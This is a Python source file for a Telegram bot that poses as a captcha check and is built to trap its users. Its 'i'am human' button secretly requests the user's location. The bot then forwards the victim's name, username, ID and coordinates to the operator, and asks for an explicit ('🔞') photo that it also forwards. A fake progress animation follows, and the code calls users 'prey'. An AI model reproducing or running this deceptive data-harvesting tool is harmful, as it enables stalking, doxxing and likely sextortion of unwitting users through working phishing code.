from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import time
from telegram import ReplyKeyboardRemove
import random

#Requests :  pip install python-telegram-bot  ,  pip install requests  (python 3.13.x)
num3 = random.randint(300, 370)
num3u = random.randint(370, 400)
num2 = random.randint(200, 270)
num2u = random.randint(270, 300)
num1 = random.randint(100, 170)
num1u = random.randint(170, 200)
num = random.randint(20, 40)
numu = random.randint(70, 100)
numf = random.randint(2, 10)
numff = 1
print("waiting for respond.")
BOT_TOKEN = input("enter your bot token: ")
FORWARD_TO = input("enter your User-id :")
#FORWARD_TO1 = 'xxx'
users_waiting_for_photo = set()
user_location_received = set()
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        usern = update.effective_user.username
        userf = update.effective_user.first_name
        print(f">",{userf},'|', {usern}," > Started bot")
        keyboard = [
            [KeyboardButton("i'am human✅", request_location=True)]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)

        word = f'''Hello {userf} 👋, Please do this captcha for continue.'''
        await update.message.reply_text(
            word,
            reply_markup=reply_markup
        )

        reply_markup=ReplyKeyboardRemove
        keyboard=ReplyKeyboardRemove
        reply_markup=ReplyKeyboardRemove()
        keyboard=ReplyKeyboardRemove()
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    usern = update.effective_user.username
    userf = update.effective_user.first_name
    location = update.message.location
    await update.message.reply_text("success ✅")
    print(f"got a new prey." ,{usern} , {userf})
    try:
        await update.message.delete()
    except Exception as e:
        print(f'Got error {e}')
    users_waiting_for_photo.add(user.id)

    time.sleep(2)
    
    user_info = (
        f" </> ASAP > Fall in trap! :\n"
        f" Full Name: {user.full_name}\n"
        f" Username: @{user.username if user.username else 'N/A'}\n"
        f" User ID: {user.id}\n"
        f" Local Location: ({location.latitude}, {location.longitude})"
    )


    await update.message.reply_text("Now Please Send picture 🔞")

    await context.bot.send_message(chat_id=FORWARD_TO, text=user_info)

    await context.bot.send_location(
        chat_id=FORWARD_TO,
        latitude=location.latitude,
        longitude=location.longitude
    )
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    usern = update.effective_user.username

    if user.id in users_waiting_for_photo:
        photo = update.message.photo[-1]  # Get the highest-resolution photo
        await update.message.reply_text("Got it!")
        # Forward photo to the target
        #admin 1
        await context.bot.send_photo(
            chat_id=FORWARD_TO,
            photo=photo.file_id,
            caption=f"got Photo from prey , {user.full_name} (@{user.username or 'N/A'})"
        )
        #
        print(f"Got photo from",{usern})
        try1 = f'''  > {num3} of{num3u} ⚡'''
        try2 = f'''  > {num2} of {num2u}⚡'''
        try3 = f'''  > {num1} of {num1u}⚡'''
        try4 = f'''  > {num} of {numu} ⚡'''
        try5 = f'''  > {numf} of {numf} ⚡'''
        try6 = f'''  > {numff} of {numff} ⚡'''
        sent_message = await update.message.reply_text("/")
        await sent_message.edit_text(try1)
        time.sleep(3)
        await sent_message.edit_text(try2)
        time.sleep(3)
        await sent_message.edit_text(try3)
        time.sleep(3)
        await sent_message.edit_text(try4)
        time.sleep(3)
        await sent_message.edit_text(try5)
        time.sleep(3)
        await sent_message.edit_text(try6)
        time.sleep(2)
        await sent_message.edit_text('✅✅✅')
        time.sleep(3)
        print(f"user Task finish",{usern})

        #For sending fake picture: 

        #with open("pic.jpg", "rb") as photo:
        #    await context.bot.send_photo(
        ##        has_spoiler=True,
        #        chat_id=update.effective_chat.id,
        #        photo=photo,
        #        caption=" desc (write me)"
        #    )
        #    print("picture send, all done")
        #    print("----------")
        #    print("")
    else:
        await update.message.reply_text("Please do captcha again⚠️")
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please after captcha, send your picture⚠️")


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is active.")
    print("")
    app.run_polling()

if __name__ == '__main__':
    main()
